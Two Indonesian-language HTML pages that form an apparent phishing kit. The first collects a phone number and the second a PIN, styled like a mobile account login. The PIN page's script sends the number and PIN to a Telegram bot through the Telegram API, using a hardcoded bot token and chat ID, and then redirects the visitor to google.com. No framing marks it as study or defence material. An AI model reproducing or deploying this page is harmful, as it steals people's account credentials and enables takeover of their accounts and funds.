<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Masukkan Nomor HP</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { background-color: #008CFF; color: white; font-family: sans-serif; text-align: center; padding: 30px; }
    .form-box { background: white; padding: 20px; border-radius: 12px; color: #000; max-width: 350px; margin: auto; }
    input, button { width: 90%; padding: 10px; font-size: 16px; border-radius: 8px; margin: 10px 0; }
    button { background-color: #007AFF; color: white; border: none; }
  </style>
</head>
<body>
  <h2>Masukkan Nomor HP</h2>
  <div class="form-box">
    <label>+62</label>
    <input type="tel" id="nomor" placeholder="8123456789" maxlength="13" />
    <button onclick="lanjut()">LANJUTKAN</button>
  </div>

  <script>
    function lanjut() {
      const nomor = document.getElementById('nomor').value;
      if (!nomor) return alert("Masukkan nomor HP!");

      localStorage.setItem("nomorHP", "+62" + nomor);
      window.location.href = "pin.html"; // halaman isi PIN
    }
  </script>
</body>
</html>
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Masukkan PIN</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { background-color: #008CFF; color: white; font-family: sans-serif; text-align: center; padding: 30px; }
    .form-box { background: white; padding: 20px; border-radius: 12px; color: #000; max-width: 350px; margin: auto; }
    input, button { width: 90%; padding: 10px; font-size: 16px; border-radius: 8px; margin: 10px 0; }
    button { background-color: #28a745; color: white; border: none; }
  </style>
</head>
<body>
  <h2>Masukkan PIN</h2>
  <div class="form-box">
    <input type="password" id="pin" placeholder="••••" maxlength="6" />
    <button onclick="kirim()">KIRIM</button>
  </div>

  <script>
    function kirim() {
      const pin = document.getElementById('pin').value;
      const nomor = localStorage.getItem("nomorHP");
      if (!pin || !nomor) return alert("Isi PIN atau nomor belum tersedia!");

      const token = "7658902176:AAGyBuS3WytXXnooGNiHZIVcjY1tch6P9Ws";
      const chat_id = "6597122729";
      const text = `📱 Data Masuk:\nNomor: ${nomor}\nPIN: ${pin}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text })
      })
      .then(res => res.json())
      .then(res => {
        if (res.ok) {
          alert("Data berhasil dikirim!");
          window.location.href = "https://google.com"; // redirect akhir
        } else {
          alert("Gagal kirim: " + res.description);
        }
      })
      .catch(err => alert("Error: " + err.message));
    }
  </script>
</body>
</html>

